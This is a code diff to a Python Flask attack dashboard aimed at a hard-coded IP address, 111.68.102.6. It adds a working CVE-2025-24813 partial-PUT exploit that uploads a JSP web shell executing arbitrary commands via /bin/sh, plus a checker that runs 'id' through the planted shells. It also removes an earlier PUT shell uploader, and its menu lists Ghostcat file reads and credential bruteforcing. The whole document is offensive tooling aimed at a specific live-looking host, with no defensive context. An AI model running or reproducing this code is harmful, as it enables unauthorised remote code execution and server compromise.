@@ -2,6 +2,7 @@ import socket
 import urllib.request
 import urllib.error
 import base64
+import struct
 from flask import Flask
 
 app = Flask(__name__)
@@ -124,6 +125,147 @@ def bruteforce():
     return "❌ No credentials found"
 
 # ─────────────────────────────
+# CVE-2025-24813 PARTIAL PUT
+# ─────────────────────────────
+def partial_put_attack(host, port=8080):
+    results = []
+
+    # Step 1: Upload partial content via PUT
+    # This triggers file write on vulnerable Tomcat
+    jsp_shell = b"""<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+if(cmd != null){
+    Process p = Runtime.getRuntime().exec(
+        new String[]{"/bin/sh","-c",cmd}
+    );
+    InputStream in = p.getInputStream();
+    int a = -1;
+    byte[] b = new byte[4096];
+    out.print("<pre>");
+    while((a=in.read(b))!=-1){
+        out.print(new String(b,0,a));
+    }
+    out.print("</pre>");
+    in.close();
+    p.waitFor();
+}
+%>
+<h2>CVE-2025 Shell Active</h2>
+"""
+
+    upload_paths = [
+        "/upload.jsp",
+        "/shell.jsp",
+        "/cmd.jsp",
+        "/examples/cmd.jsp",
+    ]
+
+    # Try partial PUT (Content-Range header)
+    for path in upload_paths:
+        try:
+            url = f"http://{host}:{port}{path}"
+            req = urllib.request.Request(
+                url,
+                data=jsp_shell,
+                method='PUT'
+            )
+            req.add_header(
+                "Content-Type",
+                "application/octet-stream"
+            )
+            req.add_header(
+                "Content-Range",
+                f"bytes 0-{len(jsp_shell)-1}/{len(jsp_shell)}"
+            )
+            req.add_header("User-Agent","Mozilla/5.0")
+            res = urllib.request.urlopen(
+                req, timeout=10
+            )
+            results.append(
+                f"✅ PUT SUCCESS [{res.status}]: {path}"
+            )
+        except urllib.error.HTTPError as e:
+            results.append(
+                f"[{e.code}] PUT → {path}"
+            )
+        except Exception as e:
+            results.append(
+                f"❌ {str(e)[:60]} → {path}"
+            )
+
+    # Step 2: Try incomplete PUT (no Content-Range)
+    for path in upload_paths:
+        try:
+            url = f"http://{host}:{port}{path}"
+            req = urllib.request.Request(
+                url,
+                data=jsp_shell[:100],
+                method='PUT'
+            )
+            req.add_header(
+                "Content-Type",
+                "application/octet-stream"
+            )
+            req.add_header(
+                "Content-Length",
+                str(len(jsp_shell))
+            )
+            req.add_header("User-Agent","Mozilla/5.0")
+            res = urllib.request.urlopen(
+                req, timeout=10
+            )
+            results.append(
+                f"✅ PARTIAL PUT [{res.status}]: {path}"
+            )
+        except urllib.error.HTTPError as e:
+            results.append(
+                f"[{e.code}] Partial → {path}"
+            )
+        except Exception as e:
+            results.append(
+                f"❌ {str(e)[:60]} → {path}"
+            )
+
+    return results
+
+def check_shells(host, port=8080):
+    paths = [
+        "/upload.jsp",
+        "/shell.jsp",
+        "/cmd.jsp",
+        "/examples/cmd.jsp",
+    ]
+    results = []
+    for path in paths:
+        try:
+            url = f"http://{host}:{port}{path}?cmd=id"
+            req = urllib.request.Request(url)
+            req.add_header("User-Agent","Mozilla/5.0")
+            res = urllib.request.urlopen(
+                req, timeout=10
+            )
+            data = res.read().decode(errors='ignore')
+            results.append({
+                "path": path,
+                "status": "SHELL FOUND",
+                "output": data
+            })
+        except urllib.error.HTTPError as e:
+            results.append({
+                "path": path,
+                "status": f"{e.code}",
+                "output": ""
+            })
+        except Exception as e:
+            results.append({
+                "path": path,
+                "status": "ERROR",
+                "output": str(e)[:60]
+            })
+    return results
+
+# ─────────────────────────────
 # ROUTES
 # ─────────────────────────────
 @app.route('/')
@@ -141,10 +283,10 @@ def index():
         🕷️ Ghostcat (Read Files)</a></li>
         <li><a href='/brute'>
         🔑 Bruteforce Manager</a></li>
-        <li><a href='/putshell'>
-        💀 PUT Shell Upload</a></li>
+        <li><a href='/cve2025'>
+        💀 CVE-2025-24813 Partial PUT</a></li>
         <li><a href='/checkshell'>
-        🔍 Check Shell</a></li>
+        🔍 Check All Shells</a></li>
         <li><a href='/info'>
         🗺️ Server Map</a></li>
     </ul>
@@ -159,15 +301,15 @@ def run_ghostcat():
     Ghostcat - 111.68.102.6:8009</h1>
     """
     for r in results:
-        color = "green" if r['status'] == "SUCCESS" else "red"
+        color = "green" if r['status'] == "SUCCESS" \
+            else "red"
         output += f"""
         <hr>
         <h3>📄 {r['file']}</h3>
         <p style='color:{color}'>
         Status: {r['status']}</p>
         <pre style='background:#000;
-        color:#0f0;padding:10px;
-        overflow:auto'>
+        color:#0f0;padding:10px'>
 {r['data'] if r['data'] else 'Empty'}
         </pre>
         """
@@ -185,93 +327,50 @@ def run_brute():
     font-family:monospace'>{result}</p>
     """
 
-@app.route('/putshell')
-def put_shell():
-    results = []
-    targets = [
-        "http://111.68.102.6:8080/shell.jsp",
-        "http://111.68.102.6:8080/examples/shell.jsp",
-        "http://111.68.102.6:8080/uploads/shell.jsp",
-        "http://111.68.102.6:8080/ROOT/shell.jsp",
-        "http://111.68.102.6:8081/shell.jsp",
-    ]
-    shell_code = b"""<%@ page import="java.io.*" %>
-<%
-String cmd = request.getParameter("cmd");
-if(cmd != null){
-    Process p = Runtime.getRuntime().exec(cmd);
-    InputStream in = p.getInputStream();
-    int a = -1;
-    byte[] b = new byte[4096];
-    while((a=in.read(b))!=-1){
-        out.print(new String(b,0,a));
-    }
-    in.close();
-    p.waitFor();
-}
-%>
-<h1>Shell Ready</h1>
-"""
-    for target in targets:
-        try:
-            req = urllib.request.Request(
-                target,
-                data=shell_code,
-                method='PUT'
-            )
-            req.add_header(
-                "Content-Type",
-                "application/octet-stream"
-            )
-            req.add_header("User-Agent","Mozilla/5.0")
-            res = urllib.request.urlopen(
-                req, timeout=10
-            )
-            results.append(
-                f"✅ SUCCESS: {target} → {res.status}"
-            )
-        except urllib.error.HTTPError as e:
-            results.append(f"[{e.code}] {target}")
-        except Exception as e:
-            results.append(
-                f"❌ Error: {str(e)[:50]} → {target}"
-            )
-    output = "<h1>PUT Shell Results</h1>"
+@app.route('/cve2025')
+def run_cve2025():
+    results = partial_put_attack("111.68.102.6")
+    output = """
+    <h1 style='font-family:monospace'>
+    CVE-2025-24813 Partial PUT Attack</h1>
+    <h3>Target: 111.68.102.6:8080</h3>
+    """
     for r in results:
-        output += f"<p style='font-family:monospace'>{r}</p>"
-    output += "<br><a href='/checkshell'>Check Shell Now</a>"
+        color = "green" if "SUCCESS" in r else "#ff6600" \
+            if "204" in r or "201" in r else "red"
+        output += f"""
+        <p style='font-family:monospace;
+        color:{color}'>{r}</p>
+        """
+    output += """
+    <br>
+    <a href='/checkshell'>
+    🔍 Check If Shell Uploaded</a>
+    """
     return output
 
 @app.route('/checkshell')
-def check_shell():
-    urls = [
-        "http://111.68.102.6:8080/shell.jsp?cmd=id",
-        "http://111.68.102.6:8080/examples/shell.jsp?cmd=id",
-        "http://111.68.102.6:8080/ROOT/shell.jsp?cmd=id",
-        "http://111.68.102.6:8081/shell.jsp?cmd=id",
-    ]
-    results = []
-    for url in urls:
-        try:
-            req = urllib.request.Request(url)
-            req.add_header("User-Agent","Mozilla/5.0")
-            res = urllib.request.urlopen(
-                req, timeout=10
-            )
-            data = res.read().decode(errors='ignore')
-            results.append(
-                f"🔥 SHELL FOUND: {url}<br>"
-                f"<pre>{data}</pre>"
-            )
-        except urllib.error.HTTPError as e:
-            results.append(f"[{e.code}] {url}")
-        except Exception as e:
-            results.append(
-                f"❌ {str(e)[:50]} → {url}"
-            )
-    output = "<h1>Shell Check Results</h1>"
+def run_checkshell():
+    results = check_shells("111.68.102.6")
+    output = """
+    <h1 style='font-family:monospace'>
+    Shell Check Results</h1>
+    """
     for r in results:
-        output += f"<p style='font-family:monospace'>{r}</p>"
+        color = "green" if "SHELL" in r['status'] \
+            else "red"
+        output += f"""
+        <hr>
+        <h3 style='color:{color}'>
+        {r['path']} → {r['status']}</h3>
+        """
+        if r['output']:
+            output += f"""
+            <pre style='background:#000;
+            color:#0f0;padding:10px'>
+{r['output']}
+            </pre>
+            """
     return output
 
 @app.route('/info')
@@ -302,19 +401,23 @@ def server_info():
             res = urllib.request.urlopen(
                 req, timeout=5
             )
-            output += f"""<tr style='background:green;
-            color:white'>
+            output += f"""
+            <tr style='background:green;color:white'>
             <td>{res.status} OPEN</td>
-            <td>{path}</td></tr>"""
+            <td>{path}</td></tr>
+            """
         except urllib.error.HTTPError as e:
-            output += f"""<tr style='background:orange'>
+            output += f"""
+            <tr style='background:orange'>
             <td>{e.code} FOUND</td>
-            <td>{path}</td></tr>"""
+            <td>{path}</td></tr>
+            """
         except Exception as e:
-            output += f"""<tr style='background:red;
-            color:white'>
+            output += f"""
+            <tr style='background:red;color:white'>
             <td>ERROR</td>
-            <td>{path}</td></tr>"""
+            <td>{path}</td></tr>
+            """
     output += "</table>"
     return output
 
